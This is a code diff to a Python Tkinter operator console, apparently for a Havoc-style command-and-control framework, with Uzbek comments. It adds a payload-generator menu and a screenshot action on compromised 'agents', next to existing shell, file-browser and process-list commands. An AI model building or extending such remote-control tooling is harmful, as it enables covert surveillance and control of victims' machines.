@@ -28,8 +28,9 @@ class HavocGUI:
         self.root.geometry("1200x800")
         self.root.configure(bg='#1e1e1e')
         
-        # Server connection
+        # Server connection - Django REST API
         self.server_url = f"http://{SERVER_HOST}:{SERVER_PORT}"
+        self.django_api = f"{self.server_url}/api"
         self.session = requests.Session()
         
         # Data
@@ -71,9 +72,13 @@ class HavocGUI:
         file_menu = tk.Menu(menubar, tearoff=0, bg='#2d2d2d', fg='white')
         menubar.add_cascade(label="File", menu=file_menu)
         file_menu.add_command(label="New Listener", command=self.new_listener_dialog)
-        file_menu.add_command(label="Generate Payload", command=self.generate_payload_dialog)
         file_menu.add_separator()
         file_menu.add_command(label="Exit", command=self.root.quit)
+        
+        # Payloads Menu
+        payload_menu = tk.Menu(menubar, tearoff=0, bg='#2d2d2d', fg='white')
+        menubar.add_cascade(label="Payloads", menu=payload_menu)
+        payload_menu.add_command(label="🛠️ Payload Generator", command=self.open_payload_generator)
         
         # View Menu
         view_menu = tk.Menu(menubar, tearoff=0, bg='#2d2d2d', fg='white')
@@ -481,17 +486,49 @@ class HavocGUI:
     def show_session_context_menu(self, event):
         """Session context menu"""
         context_menu = tk.Menu(self.root, tearoff=0, bg='#2d2d2d', fg='white')
-        context_menu.add_command(label="Shell", command=self.open_shell)
-        context_menu.add_command(label="File Browser", command=self.open_file_browser)
-        context_menu.add_command(label="Process List", command=lambda: self.quick_command("ps"))
-        context_menu.add_command(label="System Info", command=lambda: self.quick_command("sysinfo"))
+        context_menu.add_command(label="💻 Shell", command=self.open_shell)
+        context_menu.add_command(label="📸 Screenshot", command=self.take_screenshot)
+        context_menu.add_command(label="📁 File Browser", command=self.open_file_browser)
+        context_menu.add_command(label="📋 Process List", command=lambda: self.quick_command("ps"))
+        context_menu.add_command(label="ℹ️ System Info", command=lambda: self.quick_command("sysinfo"))
         context_menu.add_separator()
-        context_menu.add_command(label="Kill Session", command=self.kill_session)
+        context_menu.add_command(label="❌ Kill Session", command=self.kill_session)
         
         try:
             context_menu.tk_popup(event.x_root, event.y_root)
         finally:
             context_menu.grab_release()
+    
+    def take_screenshot(self):
+        """Screenshot olish"""
+        if not self.selected_agent:
+            self.log_to_console("❌ Agent tanlanmagan!", "ERROR")
+            return
+        
+        try:
+            # Screenshot viewer import
+            try:
+                from screenshot_viewer import ScreenshotViewer
+                viewer = ScreenshotViewer(self.root, self.selected_agent, self.server_url)
+                viewer.show()
+                self.log_to_console(f"📸 Screenshot viewer ochildi: {self.selected_agent[:8]}", "INFO")
+            except ImportError:
+                # Fallback - oddiy so'rov
+                self.log_to_console("📸 Screenshot so'ralmoqda...", "INFO")
+                
+                response = self.session.get(
+                    f"{self.server_url}/api/screenshot/{self.selected_agent}",
+                    timeout=10
+                )
+                
+                if response.status_code == 200:
+                    result = response.json()
+                    self.log_to_console(f"✅ {result.get('message', 'Screenshot yuborildi')}", "SUCCESS")
+                else:
+                    self.log_to_console("❌ Screenshot xatosi!", "ERROR")
+                    
+        except Exception as e:
+            self.log_to_console(f"❌ Screenshot xatosi: {e}", "ERROR")
     
     def open_shell(self):
         """Shell ochish"""
@@ -546,6 +583,14 @@ class HavocGUI:
         
         thread = threading.Thread(target=auto_refresh, daemon=True)
         thread.start()
+    
+    def open_payload_generator(self):
+        """Payload Generator oynasini ochish"""
+        try:
+            from gui.payload_generator_gui import PayloadGeneratorGUI
+            PayloadGeneratorGUI(parent=self.root)
+        except Exception as e:
+            messagebox.showerror("Error", f"Payload Generator ochishda xato:\n{str(e)}")
     
     def run(self):
         """GUI ishga tushirish"""
